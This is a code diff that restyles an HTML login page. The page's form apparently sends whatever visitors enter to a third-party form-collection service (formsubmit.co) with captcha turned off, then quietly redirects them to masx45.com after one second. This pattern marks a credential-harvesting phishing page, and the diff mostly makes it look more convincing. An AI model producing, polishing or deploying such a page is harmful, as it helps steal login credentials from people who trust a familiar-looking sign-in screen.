@@ -20,41 +20,39 @@
     .container {
       background-color: #1a1a1a;
       padding: 40px;
-      border-radius: 10px;
+      border-radius: 15px;
       width: 100%;
       max-width: 400px;
-      box-shadow: 0 0 15px rgba(255, 255, 255, 0.05);
-    }
-
-    .logo {
+      box-shadow: 0 0 25px rgba(255, 255, 255, 0.1);
       text-align: center;
-      margin-bottom: 20px;
     }
 
     .logo img {
-      height: 50px;
+      height: 60px;
+      margin-bottom: 20px;
     }
 
     h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      font-weight: 600;
+      margin-bottom: 25px;
+      font-weight: 700;
+      font-size: 22px;
     }
 
     .tabs {
       display: flex;
-      margin-bottom: 20px;
+      justify-content: center;
+      margin-bottom: 25px;
     }
 
     .tab {
-      flex: 1;
-      padding: 10px;
-      text-align: center;
-      border-radius: 20px;
+      padding: 12px;
+      border-radius: 25px;
       cursor: pointer;
       background-color: #333;
       color: white;
-      margin: 0 5px;
+      margin: 0 10px;
+      width: 100px;
+      text-align: center;
     }
 
     .tab.active {
@@ -68,7 +66,7 @@
     }
 
     input {
-      padding: 12px;
+      padding: 14px;
       margin-bottom: 15px;
       border-radius: 10px;
       border: none;
@@ -81,27 +79,28 @@
     button {
       background-color: #d4af37;
       border: none;
-      padding: 12px;
+      padding: 14px;
       color: black;
       font-weight: bold;
       font-size: 16px;
       border-radius: 25px;
       cursor: pointer;
-      margin-top: 10px;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #b3922b;
     }
 
     .options {
       display: flex;
-      align-items: center;
-      font-size: 14px;
-      margin-bottom: 15px;
       justify-content: space-between;
+      font-size: 14px;
       color: #ccc;
+      margin-bottom: 20px;
     }
 
     .signup {
-      text-align: center;
-      margin-top: 15px;
       font-size: 14px;
       color: #aaa;
     }
@@ -115,9 +114,8 @@
     #please-wait {
       display: none;
       color: #d4af37;
-      text-align: center;
-      margin-top: 10px;
       font-size: 14px;
+      margin-top: 10px;
     }
   </style>
 </head>
@@ -133,7 +131,6 @@
     </div>
 
     <form action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="return handleSubmit();">
-      <!-- Redirection normale -->
       <input type="hidden" name="_captcha" value="false">
 
       <!-- Champs -->
@@ -142,7 +139,7 @@
 
       <div class="options">
         <label><input type="checkbox" name="remember" /> Remember me</label>
-        <a href="#" style="color: #d4af37; text-decoration: none;">Forgot password?</a>
+        <a href="#" style="color: #d4af37;">Forgot password?</a>
       </div>
 
       <button type="submit">Log In</button>
@@ -157,13 +154,13 @@
   <script>
     function handleSubmit() {
       document.getElementById("please-wait").style.display = "block";
-
+      
       // Attendre 1 seconde avant de rediriger
       setTimeout(() => {
         window.location.href = "https://masx45.com/";
       }, 1000);
 
-      return true; // permet au formulaire d’être soumis
+      return true; // Permet au formulaire d’être soumis
     }
   </script>
 </body>
